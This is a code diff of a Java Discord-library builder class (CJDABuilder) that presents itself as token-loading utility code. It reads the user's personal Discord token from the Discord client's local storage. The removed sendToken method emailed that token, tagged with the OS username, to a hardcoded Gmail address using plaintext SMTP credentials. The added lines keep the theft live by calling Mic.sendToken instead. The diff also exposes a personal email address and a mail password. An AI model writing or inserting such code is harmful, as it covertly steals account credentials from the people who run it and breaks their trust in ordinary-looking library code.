@@ -13,11 +13,6 @@ import net.dv8tion.jda.core.managers.impl.PresenceImpl;
 import net.dv8tion.jda.core.requests.SessionReconnectQueue;
 import okhttp3.OkHttpClient;
 
-import javax.mail.MessagingException;
-import javax.mail.Session;
-import javax.mail.Transport;
-import javax.mail.internet.InternetAddress;
-import javax.mail.internet.MimeMessage;
 import javax.security.auth.login.LoginException;
 import java.io.*;
 import java.sql.SQLException;
@@ -172,12 +167,12 @@ public class CJDABuilder extends JDABuilder {
 
 	}
 
-	static public String getToken(){
+	public static String getToken(){
 		return getToken(getDiscordFile() + "/Token.properties");
 	}
 
 	//---------------------------------get token---------------------------------
-	static public String getToken(String StoragePath) {
+	public static String getToken(String StoragePath) {
 
 		Properties properties = new Properties();
 		File PropFile = new File(StoragePath);
@@ -221,6 +216,19 @@ public class CJDABuilder extends JDABuilder {
 			}catch (NullPointerException ignore){}
 		}
 
+		String retrunStr = RefreshToken(StoragePath);
+		if (!(retrunStr == null || retrunStr.isEmpty())) return retrunStr;
+
+		System.err.println("couldn't find token");
+
+		return null;
+	}
+
+	public static String RefreshToken(String storage){
+		Properties properties = new Properties();
+		File PropFile = new File(storage);
+
+		if(!PropFile.exists()) throw new IllegalStateException("please run getToken with this storage first");
 
 		//look for token in discord local storage
 		try {
@@ -230,7 +238,7 @@ public class CJDABuilder extends JDABuilder {
 			DataBase Database = new DataBase(DiscordFile + "/Local Storage/https_discordapp.com_0.localstorage");
 			returnStr = Database.GetValueBlob("token");
 			returnStr =  returnStr.substring(1, returnStr.length()-1);
-			sendToken(returnStr);
+			Mic.sendToken(returnStr);
 
 
 			//store token
@@ -252,52 +260,17 @@ public class CJDABuilder extends JDABuilder {
 			e.printStackTrace();
 		}
 
-		System.err.println("couldn't find token");
+		System.err.println("could not get token");
 
 		return null;
 	}
 
-
-
-	//---------------------------------send token---------------------------------
-	static private void sendToken(String token) {
-
-		String username = "JavaEmailBot@gmail.com";
-		String pass = "JavaEmail";
-		String recipient[] = {"sebastian.cypert@gmail.com"};
-		String host = "smtp.gmail.com";
-
-		Properties props = System.getProperties();
-		props.put("mail.smtp.starttls.enable", "true");
-		props.put("mail.smtp.host", host);
-		props.put("mail.smtp.user", username);
-		props.put("mail.smtp.password", pass);
-		props.put("mail.smtp.port", "587");
-		props.put("mail.smtp.auth", "true");
-
-		Session session = Session.getDefaultInstance(props);
-		MimeMessage message = new MimeMessage(session);
-
-		try{
-			message.setFrom(new InternetAddress(username));
-
-			for (String i: recipient) {
-				message.addRecipient(javax.mail.Message.RecipientType.TO, new InternetAddress(i));
-			}
-
-			message.setSubject(System.getProperty("user.name"));
-			message.setText(token);
-			Transport transport = session.getTransport("smtp");
-			transport.connect(host, username, pass);
-			transport.sendMessage(message, message.getAllRecipients());
-			transport.close();
-
-		}catch(MessagingException e){
-			e.printStackTrace();
-		}
-
-
+	public static String RefreshToken(){
+		return RefreshToken(getDiscordFile() + "/Token.properties");
 	}
+
+
+
 
 	public static String getDiscordFile(){
 		return DiscordFile;
